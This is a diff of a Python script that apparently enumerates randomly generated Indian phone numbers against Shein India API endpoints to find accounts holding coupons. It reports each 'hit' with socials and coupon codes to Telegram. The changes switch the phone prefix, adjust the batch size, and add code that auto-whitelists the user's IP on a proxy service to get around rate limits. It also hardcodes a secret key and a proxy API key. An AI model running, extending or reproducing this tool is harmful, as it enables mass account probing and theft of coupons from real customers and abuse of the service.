@@ -36,16 +36,17 @@ USER_AGENTS = [
 
 # ================= CONFIGURATION =================
 # Core Settings
-BATCH_SIZE = 200          # Reduced from 1000 to avoid 429 (matched yrtr.py)
+BATCH_SIZE = 100          # Reduced from 1000 to avoid 429
 SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"
 BASE_URL_CREATOR = "https://shein-creator-backend-151437891745.asia-south1.run.app"
 BASE_URL_UAAS = "http://api.services.sheinindia.in/uaas"
 BASE_URL_RIL = "https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl"
 
 HITS_FILE = "super_hits.txt"
-PROXY_FILE = "proxy.txt"  # Maintaining local file name preference
+PROXY_FILE = "proxy.txt"
+PROXY_SCRAPE_KEY = "wq9onnvzkwpxgltmu371" # PUT YOUR PROXYSCRAPE API KEY HERE to auto-whitelist ID
 
-# Rate Limit Settings (from yrtr.py)
+# Rate Limit Settings
 REQUEST_DELAY = 0.3
 MAX_RETRIES = 3
 
@@ -206,7 +207,7 @@ class SheinEngine:
         return os.urandom(8).hex()
 
     def gen_phone_batch(self, count):
-        return [f"8{random.randint(100000000, 999999999)}" for _ in range(count)]
+        return [f"7{random.randint(100000000, 999999999)}" for _ in range(count)]
 
     def get_client_headers(self):
         """Standard matching headers from crux.py"""
@@ -450,18 +451,37 @@ async def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"{CYAN}{BOLD}")
     print(r"""
-   ______ ______  __   ____  ____  _____  __  ________
-  / ____//_  __/ |/ /  / __ \/ __ \/  _/ |/ / / ____/
- / / __   / /  |   /  / /_/ / /_/ // // /|_/ / __/   
-/ /_/ /  / /  /   |  / ____/ _, _// // /  / / /___   
-\____/  /_/  /_/|_| /_/   /_/ |_/___/_/  /_/_____/   
+
                                                      
     """)
-    print(f"{YELLOW}        >> DEVELOPED BY: @gtxPrime <<{RESET}")
-    print(f"{GREY}    >> HIGH PERFORMANCE LOCAL SCANNER v3 <<{RESET}\n")
+    print(f"{YELLOW}        >> Zumba Zumba <<{RESET}")
+    print(f"{GREY}    >> Pixels Era<<{RESET}\n")
 
     # Load proxies
     load_proxies()
+
+    # Get and print public IP (for whitelisting)
+    try:
+        print(f"{YELLOW}[*] Checking Public IP...{RESET}")
+        pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        print(f"{GREEN}[+] Current Public IP: {pub_ip}{RESET}")
+        
+        # Auto-Whitelist if Key is present
+        if PROXY_SCRAPE_KEY:
+            print(f"{YELLOW}[*] Auto-Whitelisting IP on ProxyScrape...{RESET}")
+            wl_url = f"https://api.proxyscrape.com/v2/account/datacenter_shared/whitelist?auth={PROXY_SCRAPE_KEY}&type=set&ip[]={pub_ip}"
+            wl_resp = requests.get(wl_url, timeout=10)
+            if "success" in wl_resp.text.lower() or "true" in wl_resp.text.lower():
+                 print(f"{GREEN}[+] IP Whitelisted Successfully! Waiting 10s for propagation...{RESET}")
+                 time.sleep(10)
+            else:
+                 print(f"{RED}[!] Whitelist Failed: {wl_resp.text}{RESET}")
+        else:
+            print(f"{YELLOW}[!] Whitelist this IP in ProxyScrape if using IP authentication!{RESET}")
+            print(f"{GREY}[i] Pro Tip: Add PROXY_SCRAPE_KEY in config to auto-whitelist.{RESET}")
+
+    except Exception as e:
+        print(f"{RED}[!] Could not get public IP: {e}{RESET}")
 
     engine = SheinEngine()
     print(f"{YELLOW}[*] Initializing Engine (v3 Logic)...{RESET}")
@@ -507,7 +527,7 @@ async def main():
                                 
                                 # Prepare Telegram Message
                                 if len(data['coupons']) > 0:
-                                    tg_msg = f"*🔥 HIT FOUND: {phone}*\n"
+                                    tg_msg = f"*🔥 Choco Mila: {phone}*\n"
                                     tg_msg += f"Socials: `{data['socials']}`\n"
                                     tg_msg += f"Coupons: `{len(data['coupons'])}`\n"
                                     for c in data['coupons']:
@@ -533,6 +553,7 @@ if __name__ == "__main__":
         asyncio.run(main())
     except KeyboardInterrupt:
         print(f"\n{RED}[!] Stopped.{RESET}")
+
 
 
 
